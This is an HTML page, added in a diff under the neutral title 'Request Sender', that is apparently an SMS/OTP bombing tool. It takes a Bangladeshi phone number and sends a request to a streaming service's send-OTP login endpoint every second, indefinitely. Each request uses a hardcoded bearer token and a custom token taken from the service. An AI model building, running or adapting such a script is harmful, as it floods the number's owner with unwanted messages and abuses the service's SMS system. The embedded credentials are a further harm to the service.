@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Request Sender</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #e9ecef;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            color: #495057;
+        }
+        #modalBackdrop {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+        #requestContainer {
+            width: 90%;
+            max-width: 400px;
+            background: #ffffff;
+            border-radius: 12px;
+            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.1);
+            padding: 25px;
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            border: 1px solid #dee2e6;
+        }
+        #requestContainer h3 {
+            margin: 0;
+            font-size: 22px;
+            color: #343a40;
+            text-align: center;
+            font-weight: 500;
+        }
+        #requestContainer input {
+            padding: 15px;
+            border: 1px solid #ced4da;
+            border-radius: 8px;
+            font-size: 16px;
+            width: 100%;
+            box-sizing: border-box;
+            outline: none;
+            transition: border-color 0.3s;
+        }
+        #requestContainer input:focus {
+            border-color: #007bff;
+            box-shadow: 0 0 8px rgba(0, 123, 255, 0.5);
+        }
+        #requestContainer button {
+            padding: 15px;
+            border: none;
+            border-radius: 8px;
+            background: #007bff;
+            color: #ffffff;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background 0.3s, transform 0.2s;
+            width: 100%;
+        }
+        #requestContainer button:hover {
+            background: #0056b3;
+            transform: scale(1.05);
+        }
+        #outputContainer {
+            margin-top: 15px;
+            max-height: 200px;
+            overflow-y: auto;
+            border-top: 1px solid #dee2e6;
+            padding-top: 10px;
+            font-size: 14px;
+            color: #495057;
+        }
+        #outputContainer div {
+            padding: 12px;
+            border-radius: 8px;
+            margin-bottom: 10px;
+            background: #f8f9fa;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+        #outputContainer div:nth-child(odd) {
+            background: #f1f3f5;
+        }
+        #footer {
+            position: fixed;
+            bottom: 10px;
+            font-size: 14px;
+            color: #6c757d;
+        }
+        #footer a {
+            color: #007bff;
+            text-decoration: none;
+        }
+        #footer a:hover {
+            text-decoration: underline;
+        }
+        /* Responsive Design */
+        @media (max-width: 600px) {
+            #requestContainer {
+                width: 95%;
+                padding: 20px;
+            }
+            #requestContainer h3 {
+                font-size: 20px;
+            }
+            #requestContainer input, #requestContainer button {
+                font-size: 14px;
+                padding: 12px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+<div id="modalBackdrop">
+    <div id="requestContainer">
+        <h3>Send Request</h3>
+        <input type="text" id="msisdnInput" placeholder="Enter Number (e.g., 01...)" maxlength="11" pattern="\d{11}" required>
+        <button id="sendButton">Send Request</button>
+        <div id="outputContainer"></div>
+    </div>
+
+<div id="footer">
+    Developed by <a href="https://www.linkedin.com/in/md-fahim-sarker/" target="_blank">Md. Fahim Sarker</a>
+</div>
+</div>
+
+
+<script>
+    function appendOutput(message, isError = false) {
+        const outputContainer = document.getElementById('outputContainer');
+        const messageElement = document.createElement('div');
+        messageElement.textContent = message;
+        messageElement.style.backgroundColor = isError ? '#f8d7da' : '#d4edda';
+        messageElement.style.color = isError ? '#721c24' : '#155724';
+        outputContainer.appendChild(messageElement);
+        outputContainer.scrollTop = outputContainer.scrollHeight; // Auto-scroll to the bottom
+    }
+
+    function sendRequest(msisdn) {
+        // Prepend '88' to the MSISDN
+        const fullMsisdn = '88' + msisdn;
+
+        fetch('https://api3.bioscopelive.com/auth/api/v2/login/send-otp', {
+            method: 'POST',
+            headers: {
+                'Accept-Language': 'en',
+                'Access-Code': 'QkQ%3D',
+                'Client-Id': 'c3c98d1b-c581-452d-a385-941ca69401e9',
+                'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJiMDFlMGM2My0zOTdhLTQ4NDMtOTc4My1iMDM3M2Q5ZDFlYmIiLCJpc3MiOiJIRUlNREFMTCIsInJvbGVzIjpbIlJPTEVfVVNFUiIsIlJPTEVfVVNFUl9BTk9OWU1PVVMiXSwidXNlcm5hbWUiOiJhbm9ueW1vdXMiLCJjbGllbnRfbG9naW5faWQiOjI2NTA5ODE5NjM0LCJjbGllbnRfaWQiOiJjNDNiMDI0OGRiMWY0NGNmYmU2ZmExZTQ2YmNmNWQ3OCIsInBsYXRmb3JtX2lkIjoiYzNjOThkMWItYzU4MS00NTJkLWEzODUtOTQxY2E2OTQwMWU5IiwiYm9uZ29faWQiOiJiMDFlMGM2My0zOTdhLTQ4NDMtOTc4My1iMDM3M2Q5ZDFlYmIiLCJ1c2VyX3R5cGUiOiJhbm9ueW1vdXMiLCJpYXQiOjE3MjE5MTk1NDAsImV4cCI6MTcyOTY5NTU1MC4wLCJwcmVmZXJyZWRfdXNlcm5hbWUiOm51bGx9.vsi5vtZy7AVFRt_RZ592Hthv8m4Luh4mOGmEINKplORZOeWZqyyPzhxGEyNxBkhNXYUhwzZhsUqr5BE13JdylWlXZnEKdJKyUYqsSx21vSvEFQuXU34Z2NRriG7Z1gTJp_TZBdFRr84UIUFwwJNzvCg6PpSTfuMMg6n_MuN_XRmiPcTqbV92PIrFyjTcNCF074ZGQZ_dnzfErZwkMDQCaYhpTUNYdVrIJ215sPf7PyJHmwmc9pn2JJTPGpzyuI33Pro9OdPvQlTtZtFlQ4YfYp1FQZ5fvI3eHzNrKgZk6COK5-DHqbhVPP4bGlknC9KYPitXf-5_LtV5Ds1eBmkqVTkES3IQN66Z5fjAFLDBy_XWGx-aig6H0ipHxzTV7EE3EQ08VeRkgF2ZXpqJkGLILcujDf4fPUoVZHIJbG1rLgOMKCdpA_aD1v46apclXJrWzJY7cDMHoFX3poWKTXliBVdy8TkvyoAW2Pg56dKn0Ye842g248PFKKPPx399oYpEC72wxOaz1Brtdi0YRvEF6OUKMGPZk297IlovapQBc4b7JT-ZQBzbvU1n07IuJKJFCkKYo9B7TzVFqksgWjttKUeAfujwN7d70VBXH0Vn2IhzoMYvNCmGTguIVK1GgFkQnHhDu6fstQRtoVGWlGFnv8qezDkTrG74S2ldp8p8Suk',
+                'Content-Type': 'application/json',
+                'Country-Code': 'QkQ%3D',
+                'Platform-Id': 'c3c98d1b-c581-452d-a385-941ca69401e9',
+            },
+            body: JSON.stringify({
+                operator: "all",
+                msisdn: fullMsisdn,
+                token: "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJleHAiOjE3NDAzNzgwMzAuMH0.uqjbUG9iSJj6bWp2Kvfj7xbkhKupy8bCrEBtj6kfbdsq04LXryL8f0xyr9xbQBqh4susgCd76_LPLrThNfRRAQ",
+                token_type: "CUSTOM_TOKEN_V1"
+            })
+        }).then(response => response.text())
+          .then(result => appendOutput(`Response: ${result}`))
+          .catch(error => appendOutput(`Error: ${error}`, true));
+    }
+
+    document.getElementById('sendButton').addEventListener('click', function() {
+        const msisdnInput = document.getElementById('msisdnInput');
+        const msisdn = msisdnInput.value;
+
+        if (msisdn.length === 11) {
+            // Send request every second
+            setInterval(() => sendRequest(msisdn), 1000);
+        } else {
+            appendOutput('Please enter a valid 11-digit Number.', true);
+        }
+    });
+</script>
+
+</body>
+</html>
